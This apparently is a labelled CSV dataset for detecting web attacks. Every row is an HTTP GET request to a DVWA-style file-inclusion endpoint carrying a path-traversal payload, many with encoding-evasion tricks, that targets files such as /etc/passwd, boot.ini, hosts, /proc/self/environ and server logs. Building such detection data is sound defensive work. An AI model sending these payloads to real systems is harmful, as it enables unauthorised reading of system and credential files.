method,path,body,sign1,sign2,sign3,sign4,sign5,sign6,badwords,class
GET,/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd,,7,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/..\/..\/..\/..\/..\/..\/..\/etc/passwd,,0,7,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=?.%u2215?.%u2215?.%u2215?.%u2215?.%u2215?.%u2215boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=0x2e0x2eÁ%pc0x2e0x2eÁ%pcwindowsÁ%pcsystem32Á%pcdriversÁ%pcetcÁ%pchosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..à€¯..à€¯windowsà€¯system32à€¯driversà€¯etcà€¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À.À.Á¯À.À.Á¯À.À.Á¯windowsÁ¯system32Á¯driversÁ¯etcÁ¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..%2f..%2f..%2f..%2fetc%2fpasswd,,4,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini,,0,3,2,1,0,0,1,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®\ð€€®ð€€®\etc\passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À.À.À\À.À.À\À.À.À\À.À.À\etcÀ\passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../etc/issue,,4,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/À.À.À\À.À.À\À.À.À\À.À.À\À.À.À\À.À.À\À.À.À\boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae%uF025windows%uF025system32%uF025drivers%uF025etc%uF025hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2eð€€¯%2e%2eð€€¯%2e%2eð€€¯%2e%2eð€€¯%2e%2eð€€¯%2e%2eð€€¯etcð€€¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=à€®à€®Áœboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/var/adm/utmp,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀþÀþ%bg%qfetc%bg%qfpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀþÀþ%bg%qfÀþÀþ%bg%qfÀþÀþ%bg%qfÀþÀþ%bg%qfetc%bg%qfissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%ÀnÀnÀ\%ÀnÀnÀ\%ÀnÀnÀ\%ÀnÀnÀ\%ÀnÀnÀ\%ÀnÀnÀ\windowsÀ\system32À\driversÀ\etcÀ\hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀþÀþÁœÀþÀþÁœÀþÀþÁœÀþÀþÁœÀþÀþÁœetcÁœissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À.À.ø€€€¯windowsø€€€¯system32ø€€€¯driversø€€€¯etcø€€€¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/.//..//.//..//.//..//.//..//.//..//boot.ini,,5,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À^À^Á¯À^À^Á¯windowsÁ¯system32Á¯driversÁ¯etcÁ¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae%5c%c0%ae%c0%ae%5cetc%5cpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..../\..../\etc/\passwd,,2,0,0,0,0,2,2,bad
GET,/vulnerabilities/fi/?page=/.\\..\\.\\..\\boot.ini,,0,2,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae%u2215etc%u2215issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®0x5cboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®À%9vø€€€®ø€€€®À%9vø€€€®ø€€€®À%9vø€€€®ø€€€®À%9vø€€€®ø€€€®À%9vø€€€®ø€€€®À%9vwindowsÀ%9vsystem32À%9vdriversÀ%9vetcÀ%9vhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=??%5%cboot.ini,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..Á¯..Á¯..Á¯..Á¯etcÁ¯passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..Á¯..Á¯..Á¯etcÁ¯passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2eÀ/%2e%2eÀ/%2e%2eÀ/%2e%2eÀ/%2e%2eÀ/%2e%2eÀ/boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.?À%qf.?À%qf.?À%qf.?À%qf.?À%qf.?À%qfetcÀ%qfpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀþÀþÀ/ÀþÀþÀ/ÀþÀþÀ/ÀþÀþÀ/ÀþÀþÀ/ÀþÀþÀ/etcÀ/passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2%e%2%e/%2%e%2%e/etc/passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2e%5%c%2e%2e%5%cetc%5%cissue,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=..%2%f..%2%f..%2%f..%2%fboot.ini,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®%uF025etc%uF025issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=??Áœ??Áœ??Áœ??Áœ??ÁœetcÁœpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/etc/mailman/mm_cfg.py,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=0x2e0x2e%c0%af0x2e0x2e%c0%afetc%c0%afpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/tmp/sess_<sessid>,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=%2%e%2%e0x2fetc0x2fissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..Á¯etcÁ¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=\..0x2f\..0x2fboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..%2f..%2f..%2f..%2f/etc/passwd;index.html,,4,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=0x2e0x2e\windows\system32\drivers\etc\hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..À¯..À¯..À¯..À¯windowsÀ¯system32À¯driversÀ¯etcÀ¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0eÀ\etcÀ\passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..%bg%qf..%bg%qf..%bg%qf..%bg%qf..%bg%qf..%bg%qfboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À^À^ÁœÀ^À^Áœboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.,,0,0,1,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=\\\..\..\..\boot.ini,,0,3,2,1,0,0,1,bad
GET,/vulnerabilities/fi/?page=%ÀnÀnÁ%ÀnÀnÁ%ÀnÀnÁ%ÀnÀnÁ%ÀnÀnÁ%ÀnÀnÁetcÁissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=\..0x2f\..0x2fetc0x2fpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®Á%8sø€€€®ø€€€®Á%8setcÁ%8spasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀþÀþÁ%pcÀþÀþÁ%pcÀþÀþÁ%pcÀþÀþÁ%pcwindowsÁ%pcsystem32Á%pcdriversÁ%pcetcÁ%pchosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À^À^0x5cboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®À/ø€€€®ø€€€®À/ø€€€®ø€€€®À/ø€€€®ø€€€®À/etcÀ/passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=à€®à€®Á%8sà€®à€®Á%8sà€®à€®Á%8sà€®à€®Á%8sà€®à€®Á%8swindowsÁ%8ssystem32Á%8sdriversÁ%8setcÁ%8shosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=0x2e0x2e%c0%af0x2e0x2e%c0%af0x2e0x2e%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..\..\windows\system32\drivers\etc\hosts,,0,2,1,1,0,0,2,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae%5c%c0%ae%c0%ae%5c%c0%ae%c0%ae%5cwindows%5csystem32%5cdrivers%5cetc%5chosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0e%bg%qf%uff0e%uff0e%bg%qf%uff0e%uff0e%bg%qf%uff0e%uff0e%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀþÀþ%5%cÀþÀþ%5%cÀþÀþ%5%cÀþÀþ%5%cÀþÀþ%5%cÀþÀþ%5%cwindows%5%csystem32%5%cdrivers%5%cetc%5%chosts,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=../\etc/\issue,,1,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..%u2216..%u2216..%u2216..%u2216/etc/passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®\windows\system32\drivers\etc\hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À^À^%uF025À^À^%uF025À^À^%uF025À^À^%uF025À^À^%uF025À^À^%uF025etc%uF025issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%ÀnÀn0x5c%ÀnÀn0x5cetc0x5cissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀîÀî%u2216ÀîÀî%u2216ÀîÀî%u2216ÀîÀî%u2216windows%u2216system32%u2216drivers%u2216etc%u2216hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%ÀnÀnÁ¯%ÀnÀnÁ¯%ÀnÀnÁ¯%ÀnÀnÁ¯%ÀnÀnÁ¯etcÁ¯passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=../..//../..//../..//../{FILE},,7,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®À%qfboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=??à€¯??à€¯??à€¯??à€¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/etc/nginx/nginx.conf,,0,0,0,0,0,0,4,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0e%u2215%uff0e%uff0e%u2215boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..\\\..\\\{FILE},,0,2,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=%2%e%2%eø€€€¯%2%e%2%eø€€€¯%2%e%2%eø€€€¯%2%e%2%eø€€€¯etcø€€€¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/........................................................................../../../../../../../../{FILE},,8,0,0,0,0,1,0,bad
GET,/vulnerabilities/fi/?page=/..%2f{FILE},,1,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=%2%e%2%eà€¯%2%e%2%eà€¯etcà€¯passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0e%2%f%uff0e%uff0e%2%f%uff0e%uff0e%2%f%uff0e%uff0e%2%fwindows%2%fsystem32%2%fdrivers%2%fetc%2%fhosts,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À^À^À/À^À^À/À^À^À/etcÀ/issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À.À.%uEFC8À.À.%uEFC8À.À.%uEFC8À.À.%uEFC8À.À.%uEFC8boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=\xampp\apache\conf\httpd.conf,,0,0,0,0,0,0,5,bad
GET,/vulnerabilities/fi/?page=ÀþÀþ0x2fÀþÀþ0x2fÀþÀþ0x2fÀþÀþ0x2fÀþÀþ0x2fboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%ÀnÀn%2%f%ÀnÀn%2%fetc%2%fpasswd,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..../À\..../À\..../À\..../À\..../À\..../À\etcÀ\passwd,,6,0,0,0,0,6,2,bad
GET,/vulnerabilities/fi/?page=./../{FILE},,1,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=%2e%2e%u2215%2e%2e%u2215%2e%2e%u2215%2e%2e%u2215%2e%2e%u2215%2e%2e%u2215windows%u2215system32%u2215drivers%u2215etc%u2215hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=0x2e0x2eÀ¯0x2e0x2eÀ¯0x2e0x2eÀ¯0x2e0x2eÀ¯windowsÀ¯system32À¯driversÀ¯etcÀ¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=à€®à€®À%qfboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À.À.À¯À.À.À¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.?0x5c.?0x5c.?0x5c.?0x5cetc0x5cpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=à€®à€®%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.../.À/.../.À/.../.À/.../.À/.../.À/.../.À/etcÀ/issue,,6,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=à€®à€®%2%fà€®à€®%2%fà€®à€®%2%fwindows%2%fsystem32%2%fdrivers%2%fetc%2%fhosts,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%ÀnÀnÀ%9v%ÀnÀnÀ%9v%ÀnÀnÀ%9v%ÀnÀnÀ%9v%ÀnÀnÀ%9v%ÀnÀnÀ%9vetcÀ%9vpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2e%u2216%2e%2e%u2216etc%u2216passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À^À^0x5cÀ^À^0x5cÀ^À^0x5cÀ^À^0x5cÀ^À^0x5cÀ^À^0x5cetc0x5cpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae%5%c%c0%ae%c0%ae%5%c%c0%ae%c0%ae%5%c%c0%ae%c0%ae%5%c%c0%ae%c0%ae%5%c%c0%ae%c0%ae%5%cetc%5%cpasswd,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀîÀîÀ%9vÀîÀîÀ%9vwindowsÀ%9vsystem32À%9vdriversÀ%9vetcÀ%9vhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=../../../../../../../../../../../../../../../proc/self/environ,,15,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=??%c1%9c??%c1%9cboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................../../../../windows/system32/drivers/etc/hosts,,4,0,0,0,0,1,2,bad
GET,/vulnerabilities/fi/?page=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd,,0,8,7,4,0,0,2,bad
GET,/vulnerabilities/fi/?page=/apache/logs/error.log,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®0x5cð€€®ð€€®0x5cð€€®ð€€®0x5cð€€®ð€€®0x5cð€€®ð€€®0x5cetc0x5cpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%aeÁ¯%c0%ae%c0%aeÁ¯etcÁ¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%ÀnÀnÀ\%ÀnÀnÀ\%ÀnÀnÀ\%ÀnÀnÀ\%ÀnÀnÀ\%ÀnÀnÀ\boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%ÀnÀnÁ¯%ÀnÀnÁ¯%ÀnÀnÁ¯%ÀnÀnÁ¯etcÁ¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../{FILE},,4,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=........................................................................../../../../boot.ini,,4,0,0,0,0,1,1,bad
GET,/vulnerabilities/fi/?page=.?Áboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=../../../../../../../../../../../../localstart.asp,,12,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=dbase.php,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=À^À^ÁœÀ^À^ÁœetcÁœissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/%c0%ae%c0%ae%c1%9c{FILE},,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=.../.%u2216.../.%u2216.../.%u2216.../.%u2216etc%u2216issue,,4,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=0x2e0x2eÀ%9v0x2e0x2eÀ%9v0x2e0x2eÀ%9vetcÀ%9vissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..%5%c..%5%c..%5%cetc%5%cissue,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=à€®à€®À%9và€®à€®À%9và€®à€®À%9và€®à€®À%9và€®à€®À%9vwindowsÀ%9vsystem32À%9vdriversÀ%9vetcÀ%9vhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®Á%pcetcÁ%pcpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=C:\log\error.log,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%ÀnÀnÀ%9v%ÀnÀnÀ%9v%ÀnÀnÀ%9v%ÀnÀnÀ%9vetcÀ%9vpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=\opt\xampp\logs\access.log,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=\\&apos;/bin/cat,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},,7,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=\..%2%fboot.ini,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=.../.%2%f.../.%2%fboot.ini,,2,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=?.Á¯etcÁ¯passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.../.À¯.../.À¯.../.À¯.../.À¯.../.À¯windowsÀ¯system32À¯driversÀ¯etcÀ¯hosts,,5,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®Á¯ü€€€€®ü€€€€®Á¯ü€€€€®ü€€€€®Á¯ü€€€€®ü€€€€®Á¯ü€€€€®ü€€€€®Á¯etcÁ¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=C:/program,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini,,0,6,5,3,0,0,1,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®à€¯ð€€®ð€€®à€¯ð€€®ð€€®à€¯ð€€®ð€€®à€¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=à€®à€®Á%pcboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®%c1%9cü€€€€®ü€€€€®%c1%9cü€€€€®ü€€€€®%c1%9cü€€€€®ü€€€€®%c1%9cü€€€€®ü€€€€®%c1%9cü€€€€®ü€€€€®%c1%9cwindows%c1%9csystem32%c1%9cdrivers%c1%9cetc%c1%9chosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=?.Á?.Á?.Á?.Á?.Áboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%ÀnÀnÁ%ÀnÀnÁ%ÀnÀnÁ%ÀnÀnÁetcÁissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................../../../../../etc/passwd,,5,0,0,0,0,1,2,bad
GET,/vulnerabilities/fi/?page=??0x5c??0x5cboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..../%c0%af..../%c0%afboot.ini,,2,0,0,0,0,2,1,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..%u2216..%u2216..%u2216etc%u2216passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/%uff0e%uff0e/,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\etc\passwd,,0,5,4,2,0,0,2,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®À¯ü€€€€®ü€€€€®À¯ü€€€€®ü€€€€®À¯ü€€€€®ü€€€€®À¯ü€€€€®ü€€€€®À¯windowsÀ¯system32À¯driversÀ¯etcÀ¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À®À®ÁœÀ®À®ÁœÀ®À®ÁœÀ®À®ÁœÀ®À®ÁœÀ®À®Áœ/etc/passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=?.À/?.À/?.À/etcÀ/issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/À®À®À¯,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=\..%c1%9cwindows%c1%9csystem32%c1%9cdrivers%c1%9cetc%c1%9chosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®À¯ü€€€€®ü€€€€®À¯ü€€€€®ü€€€€®À¯ü€€€€®ü€€€€®À¯etcÀ¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=\\\../boot.ini,,1,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®%u2216ø€€€®ø€€€®%u2216ø€€€®ø€€€®%u2216ø€€€®ø€€€®%u2216ø€€€®ø€€€®%u2216boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd;index.html,,5,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%ÀnÀn%2%f%ÀnÀn%2%f%ÀnÀn%2%f%ÀnÀn%2%f%ÀnÀn%2%fetc%2%fpasswd,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À®À®À%9vÀ®À®À%9vboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/..\..\\..\{FILE},,0,3,1,1,0,0,0,bad
